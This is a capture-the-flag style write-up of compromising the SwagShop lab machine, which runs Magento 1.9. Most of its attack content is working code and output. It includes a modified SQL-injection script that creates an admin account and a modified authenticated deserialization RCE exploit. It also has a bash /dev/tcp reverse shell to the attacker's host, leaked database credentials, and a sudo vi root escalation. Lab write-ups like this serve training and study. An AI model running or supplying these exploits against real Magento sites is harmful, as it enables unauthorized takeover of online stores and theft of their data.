## Intro


tags: #linux #WebApp #GTFO #OSCPpath #known-binary #easy

----
# Reconnaissance

```shell
source basher target1 10.129.229.138 [IP]
source basher host1 swagshop.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-16 13:40 -0400
Nmap scan report for 10.129.229.138
Host is up (0.12s latency).
Not shown: 57415 closed tcp ports (reset), 8118 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.75 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-16 13:41 -0400
Nmap scan report for swagshop.htb (10.129.229.138)
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Home page
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   54.20 ms 10.10.14.1
2   54.65 ms swagshop.htb (10.129.229.138)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.73 seconds
```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```
no ports found

# Webapp

homepage
![](MediaFiles/Pasted%20image%2020260816204242.png)

## Directories

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$target1/FUZZ
```

```shell

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.229.138/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

includes                [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 52ms]
media                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 55ms]
lib                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 49ms]
app                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 53ms]
var                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 48ms]
skin                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 50ms]
pkginfo                 [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 47ms]
errors                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 48ms]
js                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 1819ms]
shell                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 45ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 48ms]
mage                    [Status: 200, Size: 1319, Words: 202, Lines: 55, Duration: 50ms]

```

then by navigating some of the discovered pages, i came accross this
`http://swagshop.htb/app/etc/local.xml`

#### creds obtained

```xml
<config>
<global>
<install>
<date>Wed, 08 May 2019 07:23:09 +0000</date>
</install>
<crypt>
<key>b355a9e0cd018d3f7f03607141518419</key>
</crypt>
<disable_local_modules>false</disable_local_modules>
<resources>
<db>
<table_prefix></table_prefix>
</db>
<default_setup>
<connection>
<host>localhost</host>
<username>root</username>
<password>fMVWh7bDHpgZkyfqQXreTjU9</password>
<dbname>swagshop</dbname>
<initStatements>SET NAMES utf8</initStatements>
<model>mysql4</model>
<type>pdo_mysql</type>
<pdoType></pdoType>
<active>1</active>
</connection>
</default_setup>
```
also on `http://swagshop.htb/app/etc/local.xml.additional`:
```xml
<!-- example of redis session storage -->
<session_save>db</session_save>
<redis_session>
<!-- All options seen here are the defaults -->
<host>127.0.0.1</host>
<!-- Specify an absolute path if using a unix socket -->
<port>6379</port>
```
this is redis related

also `/mage`
```bash
#!/bin/sh

# REPLACE with your PHP5 binary path (example: /usr/local/php5/bin/php )
#MAGE_PHP_BIN="php"

MAGE_PHP_SCRIPT="mage.php"
DOWNLOADER_PATH='downloader'

# initial setup
if test "x$1" = "xmage-setup"; then
    echo 'Running initial setup...'

    if test "x$2" != "x"; then
        MAGE_ROOT_DIR="$2"
    else
        MAGE_ROOT_DIR="`pwd`"
    fi

    $0 config-set magento_root "$MAGE_ROOT_DIR"
    $0 config-set preferred_state beta
    $0 channel-add http://connect20.magentocommerce.com/community
    exit
fi

# check that mage pear was initialized

if test "x$1" != "xconfig-set" &&
  test "x$1" != "xconfig-get" &&
  test "x$1" != "xconfig-show" &&
  test "x$1" != "xchannel-add" &&
  test "x`$0 config-get magento_root`" = "x"; then
    echo 'Please initialize Magento Connect installer by running:'
    echo "$0 mage-setup"
    exit;
fi

# find which PHP binary to use
if test "x$MAGE_PHP_BIN" != "x"; then
  PHP="$MAGE_PHP_BIN"
else
  PHP=php
fi


# get default pear dir of not set
if test "x$MAGE_ROOT_DIR" = "x"; then
    MAGE_ROOT_DIR="`pwd`/$DOWNLOADER_PATH"
fi

exec $PHP -C -q $INCARG -d output_buffering=1 -d variables_order=EGPCS \
    -d open_basedir="" -d safe_mode=0 -d register_argc_argv="On" \
    -d auto_prepend_file="" -d auto_append_file="" \
    $MAGE_ROOT_DIR/$MAGE_PHP_SCRIPT "$@"
```
then also found more interesting directories like `/var`
found nothing obvious, no versions too

## Enumerating magento webapp

since its magento, i found this tool to search more
https://github.com/steverobbins/magescan
```shell
wget https://github.com/steverobbins/magescan/releases/download/v1.12.9/magescan.phar
```

```shell
└─$ php magescan.phar scan:all http://swagshop.htb                                                                                                              
Scanning http://swagshop.htb/...

                       
  Magento Information  
                       

+-----------+------------------+
| Parameter | Value            |
+-----------+------------------+
| Edition   | Community        |
| Version   | 1.9.0.0, 1.9.0.1 |
+-----------+------------------+

                     
  Installed Modules  
                     

No detectable modules were found

                       
  Catalog Information  
                       

+------------+---------+
| Type       | Count   |
+------------+---------+
| Categories | Unknown |
| Products   | Unknown |
+------------+---------+

           
  Patches  
           

+------------+---------+
| Name       | Status  |
+------------+---------+
| SUPEE-5344 | Unknown |
| SUPEE-5994 | Unknown |
| SUPEE-6285 | Unknown |
| SUPEE-6482 | Unknown |
| SUPEE-6788 | Unknown |
| SUPEE-7405 | Unknown |
| SUPEE-8788 | Unknown |
+------------+---------+

           
  Sitemap  
           

Sitemap is not declared in robots.txt
Sitemap is not accessible: http://swagshop.htb/sitemap.xml

                     
  Server Technology  
                     

+--------+------------------------+
| Key    | Value                  |
+--------+------------------------+
| Server | Apache/2.4.29 (Ubuntu) |
+--------+------------------------+

                          
  Unreachable Path Check  
                          

+----------------------------------------------+---------------+--------+
| Path                                         | Response Code | Status |
+----------------------------------------------+---------------+--------+
| .bzr/                                        | 404           | Pass   |
| .cvs/                                        | 404           | Pass   |
| .git/                                        | 404           | Pass   |
| .git/config                                  | 404           | Pass   |
| .git/refs/                                   | 404           | Pass   |
| .gitignore                                   | 404           | Pass   |
| .hg/                                         | 404           | Pass   |
| .idea                                        | 404           | Pass   |
| .svn/                                        | 404           | Pass   |
| .svn/entries                                 | 404           | Pass   |
| admin/                                       | 404           | Pass   |
| admin123/                                    | 404           | Pass   |
| adminer.php                                  | 404           | Pass   |
| administrator/                               | 404           | Pass   |
| adminpanel/                                  | 404           | Pass   |
| aittmp/index.php                             | 404           | Pass   |
| app/etc/enterprise.xml                       | 404           | Pass   |
| app/etc/local.xml                            | 200           | Fail   |
| backend/                                     | 404           | Pass   |
| backoffice/                                  | 404           | Pass   |
| beheer/                                      | 404           | Pass   |
| capistrano/config/deploy.rb                  | 404           | Pass   |
| chive                                        | 404           | Pass   |
| composer.json                                | 404           | Pass   |
| composer.lock                                | 404           | Pass   |
| vendor/composer/installed.json               | 404           | Pass   |
| config/deploy.rb                             | 404           | Pass   |
| control/                                     | 404           | Pass   |
| dev/tests/functional/etc/config.xml          | 404           | Pass   |
| downloader/index.php                         | 404           | Pass   |
| index.php/rss/order/NEW/new                  | 200           | Fail   |
| info.php                                     | 404           | Pass   |
| mageaudit.php                                | 404           | Pass   |
| magmi/                                       | 404           | Pass   |
| magmi/conf/magmi.ini                         | 404           | Pass   |
| magmi/web/magmi.php                          | 404           | Pass   |
| Makefile                                     | 404           | Pass   |
| manage/                                      | 404           | Pass   |
| management/                                  | 404           | Pass   |
| manager/                                     | 404           | Pass   |
| modman                                       | 404           | Pass   |
| p.php                                        | 404           | Pass   |
| panel/                                       | 404           | Pass   |
| phpinfo.php                                  | 404           | Pass   |
| phpmyadmin                                   | 404           | Pass   |
| README.md                                    | 404           | Pass   |
| README.txt                                   | 404           | Pass   |
| shell/                                       | 200           | Fail   |
| shopadmin/                                   | 404           | Pass   |
| site_admin/                                  | 404           | Pass   |
| var/export/                                  | 200           | Fail   |
| var/export/export_all_products.csv           | 404           | Pass   |
| var/export/export_customers.csv              | 404           | Pass   |
| var/export/export_product_stocks.csv         | 404           | Pass   |
| var/log/                                     | 404           | Pass   |
| var/log/exception.log                        | 404           | Pass   |
| var/log/payment_authnetcim.log               | 404           | Pass   |
| var/log/payment_authorizenet.log             | 404           | Pass   |
| var/log/payment_authorizenet_directpost.log  | 404           | Pass   |
| var/log/payment_cybersource_soap.log         | 404           | Pass   |
| var/log/payment_ogone.log                    | 404           | Pass   |
| var/log/payment_payflow_advanced.log         | 404           | Pass   |
| var/log/payment_payflow_link.log             | 404           | Pass   |
| var/log/payment_paypal_billing_agreement.log | 404           | Pass   |
| var/log/payment_paypal_direct.log            | 404           | Pass   |
| var/log/payment_paypal_express.log           | 404           | Pass   |
| var/log/payment_paypal_standard.log          | 404           | Pass   |
| var/log/payment_paypaluk_express.log         | 404           | Pass   |
| var/log/payment_pbridge.log                  | 404           | Pass   |
| var/log/payment_verisign.log                 | 404           | Pass   |
| var/log/system.log                           | 404           | Pass   |
| var/report/                                  | 404           | Pass   |
+----------------------------------------------+---------------+--------+
```
interesting, we see multiple patches with status unknown, lets search the first one
`SUPEE-5344`

------
# Foothold

## Exploit to create admin user

found poc:
https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py
fixed the script in order to work
```python
import requests
import base64
import sys

target = sys.argv[1]

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"

# For demo purposes, I use the same attack as is being used in the wild
SQLQUERY="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""

# Put the nice readable queries into one line,
# and insert the username:password combinination
query = SQLQUERY.replace("\n", "").format(username="ypwq", password="123")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is {{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url, 
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter.encode()),  # Fixed: encode string to bytes
                        "forwarded": 1})
if r.ok:
    print("WORKED")
    print("Check {0}/admin with creds ypwq:123".format(target))
else:
    print("DID NOT WORK")

```
admin user was created
```shell
└─$ python3 mageadduser.py swagshop.htb                                   
WORKED
Check http://swagshop.htb/admin with creds ypwq:123
```
now access `http://swagshop.htb/index.php/admin` we are admin here
### Admin panel
![](MediaFiles/Pasted%20image%2020260816210658.png)

## RCE as admin user

found exploits for magento
```shell
─$ searchsploit magento                                                                                                                                        
------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                |  Path
------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                  | php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                       | php/webapps/38651.txt
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                            | php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                      | php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                     | php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                | php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                  | php/webapps/37811.py
Magento eCommerce - Local File Disclosure                                                                                     | php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                                                     | xml/webapps/37977.py
Magento eCommerce CE v2.3.5-p2 - Blind SQLi                                                                                   | php/webapps/50896.txt
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                        | php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                   | php/webapps/35052.txt
Magento ver. 2.4.6 - XSLT Server Side Injection                                                                               | multiple/webapps/51847.txt
Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                                                  | php/webapps/48135.php
------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(ch3ckm8㉿kali)-[~]
└─$ searchsploit -m 37811                                                                                                                                       
  Exploit: Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/37811
     Path: /usr/share/exploitdb/exploits/php/webapps/37811.py
    Codes: OSVDB-126445
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/ch3ckm8/37811.py
```
then add the admin creds manually inside the code and fix it to run:
get the date first
```shell
─$ curl -s http://swagshop.htb/app/etc/local.xml | grep -A1 -B1 "date"                                                                                         
        <install>
            <date><![CDATA[Wed, 08 May 2019 07:23:09 +0000]]></date>
        </install>
```
modify it to work:
```python
#!/usr/bin/python3
# Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE
# Google Dork: "Powered by Magento"
# Date: 08/18/2015
# Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
# Vendor Homepage: http://magento.com/
# Software Link: https://www.magentocommerce.com/download
# Version: 1.9.0.1 and below
# Tested on: Ubuntu 15
# CVE : none

from hashlib import md5
import sys
import re
import base64
import mechanize
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

def usage():
    print("Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\"" % (sys.argv[0], sys.argv[0]))
    sys.exit()

if len(sys.argv) != 3:
    usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]

# Config.
username = 'ypwq'
password = '123'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Sat, 15 Nov 2014 20:27:57 +0000'  # This needs to be the exact date from /app/etc/local.xml

# POP chain to pivot into call_user_exec
payload = 'O:8:"Zend_Log":1:{s:11:"\00*\00_writers";a:2:{i:0;O:20:"Zend_Log_Writer_Mail":4:{s:16:' \
          '"\00*\00_eventsToMail";a:3:{i:0;s:11:"EXTERMINATE";i:1;s:12:"EXTERMINATE!";i:2;s:15:"' \
          'EXTERMINATE!!!!";}s:22:"\00*\00_subjectPrependText";N;s:10:"\00*\00_layout";O:23:"'     \
          'Zend_Config_Writer_Yaml":3:{s:15:"\00*\00_yamlEncoder";s:%d:"%s";s:17:"\00*\00'     \
          '_loadedSection";N;s:10:"\00*\00_config";O:13:"Varien_Object":1:{s:8:"\00*\00_data"' \
          ';s:%d:"%s";}}s:8:"\00*\00_mail";O:9:"Zend_Mail":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)

# Setup the mechanize browser and options
br = mechanize.Browser()
#br.set_proxies({"http": "localhost:8080"})
br.set_handle_robots(False)

# Step 1: Get the login page
request = br.open(target)

# Step 2: Login
br.select_form(nr=0)
br.form.new_control('text', 'login[username]', {'value': username})  # Had to manually add username control.
br.form.fixup()
br['login[username]'] = username
br['login[password]'] = password

br.method = "POST"
request = br.submit()
content = request.read().decode('utf-8')  # Decode bytes to string for regex

# Step 3: Extract ajaxBlockUrl and FORM_KEY
url_match = re.search("ajaxBlockUrl = '(.*)'", content)
if not url_match:
    print("Could not find ajaxBlockUrl in response")
    sys.exit(1)
url = url_match.group(1)

key_match = re.search("var FORM_KEY = '(.*)'", content)
if not key_match:
    print("Could not find FORM_KEY in response")
    sys.exit(1)
key = key_match.group(1)

# Step 4: Get tunnel URL
request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
response_content = request.read().decode('utf-8')  # Decode bytes to string for regex
tunnel_match = re.search("src=\"(.*)\?ga=", response_content)
if not tunnel_match:
    print("Could not find tunnel URL in response")
    sys.exit(1)
tunnel = tunnel_match.group(1)

# Step 5: Build and send exploit
# Fix: b64encode expects bytes, so encode payload to bytes
payload_bytes = payload.encode('utf-8')
payload_b64 = base64.b64encode(payload_bytes).decode('utf-8')  # Convert to string for URL

# Fix: md5 expects bytes, so encode the concatenated string
gh = md5((payload_b64 + install_date).encode('utf-8')).hexdigest()

exploit = tunnel + '?ga=' + payload_b64 + '&h=' + gh

try:
    request = br.open(exploit)
    print(request.read().decode('utf-8'))  # Decode and print response
except (mechanize.HTTPError, mechanize.URLError) as e:
    # Fix: Handle both types of exceptions properly
    if hasattr(e, 'read'):
        print(e.read().decode('utf-8'))
    else:
        print(str(e))
```
and we get code execution
```shell
└─$ python 37811.py http://swagshop.htb/index.php/admin/ "whoami"
[*] Accessing target: http://swagshop.htb/index.php/admin/
[*] Attempting to login with credentials ypwq:123
[+] Login successful!
[+] Found FORM_KEY: Jex5grDDflaZDnH8
[+] Found tunnel URL: http://swagshop.htb/index.php/admin/dashboard/tunnel/key/ea1d1bb98c011e4c8f17c22cb29bcb97/
[*] Using install_date: Wed, 08 May 2019 07:23:09 +0000
[*] Hash: ac45fbaa8e4537ac82f346ea37f7ce86
[*] Exploit URL length: 725
[*] Sending exploit...
[+] Got response in error:
www-data
```

### Shell as www-data

lets get rev shell now
```shell
python 37811.py http://swagshop.htb/index.php/admin/  "bash -c 'bash -i >& /dev/tcp/10.10.15.168/3333 0>&1'"
```

```shell
└─$ nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.10.15.168] from (UNKNOWN) [10.129.229.138] 46306
bash: cannot set terminal process group (1855): Inappropriate ioctl for device
bash: no job control in this shell
www-data@swagshop:/var/www/html$ 
```

grabbed user flag
```shell
www-data@swagshop:/var/www/html$ cd /home
cd /home
www-data@swagshop:/home$ ls
ls
haris
www-data@swagshop:/home$ cd haris
cd haris
www-data@swagshop:/home/haris$ ls
ls
user.txt
www-data@swagshop:/home/haris$ cat user.txt
cat user.txt
e175f34c3c29568f6890e4016c10adbc
```

-----
# Privesc

## sudo -l

```shell
www-data@swagshop:/home/haris$ sudo -l
sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

## Exploiting known binary

https://gtfobins.org/gtfobins/vi/
(first run command then run `:shell` inside)
```shell
sudo -u root /usr/bin/vi /var/www/html/test  
  
:shell

whoami
root
cat /root/root.txt
3dca439f4d94dca4feab174b75a261d2
```

---
# Summary





------
# Sidenotes







